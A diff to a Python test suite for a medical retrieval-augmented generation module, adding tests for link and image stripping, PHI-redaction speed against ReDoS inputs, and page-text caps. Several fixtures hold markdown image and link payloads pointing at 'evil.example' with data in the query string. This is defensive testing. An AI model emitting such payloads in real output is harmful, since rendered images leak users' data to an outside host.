@@ -329,7 +329,8 @@ def test_fake_citations_links_and_images_removed():
     raw = "Use it [1] (ACC_2025.pdf · p. 12). ![x](https://evil.example/?d=secret) [Dosing](https://evil.example)"
     with mock.patch.object(rag, "llm_complete", return_value=raw):
         answer, _ = rag.generate_answer("q", _hits(), api_key="k")
-    assert "ACC_2025" not in answer and "evil.example" not in answer and "Dosing" in answer
+    assert "ACC_2025" not in answer and "Dosing" in answer
+    assert "](" not in answer.replace("\\]", "") and "https://" not in answer   # no live image or link
 
 
 def test_patient_mode_blocks_medicine_change_advice():
@@ -386,3 +387,35 @@ def test_keyword_stuffing_cannot_rescue_off_topic():
 def test_no_space_text_is_split():
     chunks = rag.chunk_pages([(1, "x" * 5000)])
     assert all(len(c["text"]) <= rag.CHUNK_SIZE for c in chunks)
+
+
+def test_reference_style_image_and_autolinks_neutralised():
+    raw = "Dose 5 mg [1].\n\n![x][r]\n\n[r]: https://evil.example/i.png?d=Dose <https://evil.example> www.evil.example"
+    with mock.patch.object(rag, "llm_complete", return_value=raw):
+        answer, _ = rag.generate_answer("q", _hits(), api_key="k")
+    assert "[r]:" not in answer and "https://" not in answer and "<https" not in answer
+    assert "![" not in answer
+
+
+def test_redos_inputs_are_fast():
+    import time
+    for text in ["a." * 40000, "MRN" + " " * 20000, "DOB" + " " * 20000, "Patient:" + " " * 20000 + "A"]:
+        t = time.time()
+        rag.find_phi(text)
+        rag.redact_phi(text)
+        assert time.time() - t < 1.0, text[:10]
+
+
+def test_many_names_redaction_is_fast():
+    import time
+    text = " ".join(f"Patient: Qa{i:04d}x Zb{i:04d}y" for i in range(4000))
+    text = re.sub(r"\d", lambda m: "abcdefghij"[int(m.group(0))], text)
+    t = time.time()
+    rag.redact_phi(text)
+    assert time.time() - t < 3.0
+
+
+def test_page_text_is_capped():
+    pdf = make_pdf(["word " * 2000])
+    pages, err = rag.extract_pdf_pages(pdf, "x.pdf")
+    assert not err and all(len(t) <= rag.MAX_PAGE_CHARS for _, t in pages)
